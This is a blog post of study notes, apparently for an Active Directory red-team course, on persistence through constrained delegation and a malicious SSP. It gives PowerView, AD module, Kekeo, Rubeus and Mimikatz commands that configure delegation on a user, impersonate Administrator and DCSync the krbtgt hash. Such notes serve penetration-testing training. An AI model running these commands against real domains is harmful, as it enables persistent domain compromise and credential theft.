---
title: "3 - AD Persistence"
classes: single
header:  
  teaser: /assets/images/posts/crte/crte-teaser4.jpg
  overlay_image: /assets/images/main/header8.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "Constrained Deleg and Malicious SSP"
description: "Constrained Deleg and Malicious SSP"
categories:
  - notes
  - crte
tags:
  - intermediate
  - AD
  - Windows
  - peristence 
toc: true
---



# AD Persistence

Some content are similar to CRTP:

[AD Persistence - CRTP](https://johnermac.github.io/notes/crtp/domdom/)


## msDS-AllowedToDelegateTo (Constrained Delegation)

Note that the **msDS-AllowedToDelegateTo** is the user account flag which controls the services to which a user account has access to.

> This means, with enough privileges, it is possible to access any service from a user

- Enough privileges? – SeEnableDelegationPrivilege on the DC and full rights on the target user - default for Domain Admins and Enterprise Admins.
- That is, we can force set **Trusted to Authenticate for Delegation** and **ms-DS-AllowedToDelegateTo** on a user (or create a new user - which is more noisy) and abuse it later.

**Using PowerView**:
```powershell
Set-DomainObject -Identity devuser -Set @{serviceprincipalname='dev/svc'}
Set-DomainObject -Identity devuser -Set @{"msds-allowedtodelegateto"="ldap/dc.domain.local"}
Set-DomainObject -SamAccountName devuser1 -Xor @{"useraccountcontrol"="16777216"}
Get-DomainUser –TrustedToAuth
```

**Using AD module**:
```powershell
Set-ADUser -Identity devuser -ServicePrincipalNames @{Add='dev/svc'}
Set-ADUser -Identity devuser -Add @{'msDS-AllowedToDelegateTo'= @('ldap/us-dc','ldap/dc.domain.local')} -Verbose
Set-ADAccountControl -Identity devuser -TrustedToAuthForDelegation $true
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

### Abuse using Kekeo
```powershell
kekeo# tgt::ask /user:devuser /domain:domain.local /password:Password@123!
kekeo# tgs::s4u /tgt:TGT_devuser@domain.local_krbtgt~us.techcorp.local@domain.local.kirbi /user:Administrator@domain.local /service:ldap/domain.local
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@us.techcorp.local@domain.local_ldap~dc.domain.local@domain.local.kirbi"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
```

### Abuse using Rubeus:
```powershell
Rubeus.exe hash /password:Password@123! /user:devuser /domain:domain.local
Rubeus.exe s4u /user:devuser /rc4:539259E25A0361EC4A227DD9894719F6 /impersonateuser:administrator /msdsspn:ldap/dc.domain.local /domain:domain.local /ptt
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:domain\krbtgt" "exit"
```

## Malicious SSP

- All local logons on the DC are logged to **C:\Windows\system32\kiwissp.log**

![Alt text](/assets/images/posts/crte/2.png){: .align-center}
